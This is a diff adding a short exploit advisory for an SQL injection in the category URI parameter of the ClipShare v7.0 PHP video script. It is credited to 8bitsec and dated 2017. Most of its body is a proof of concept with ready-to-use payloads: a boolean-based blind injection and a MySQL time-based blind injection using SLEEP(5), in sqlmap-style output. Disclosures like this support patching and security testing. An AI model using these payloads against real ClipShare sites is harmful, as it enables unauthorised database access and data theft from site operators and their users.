@@ -1,0 +1,41 @@
+# Exploit Title: ClipShare v7.0 - SQL Injection
+# Date: 2017-10-09
+# Exploit Author: 8bitsec
+# Vendor Homepage: http://www.clip-share.com/
+# Software Link: http://www.clip-share.com/
+# Version: 7.0
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-09
+
+Product & Service Introduction:
+===============================
+ClipShare is the first and most popular PHP video script for building highly-profitable video sharing websites.
+
+Technical Details & Description:
+================================
+
+SQL injection on [category] URI parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/videos/[category]' AND 5593=5593 AND 'LJPS'='LJPS
+
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: https://localhost/[path]/videos/[category]' AND 5593=5593 AND 'LJPS'='LJPS
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: https://localhost/[path]/videos/[category]' AND SLEEP(5) AND 'xNCN'='xNCN
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
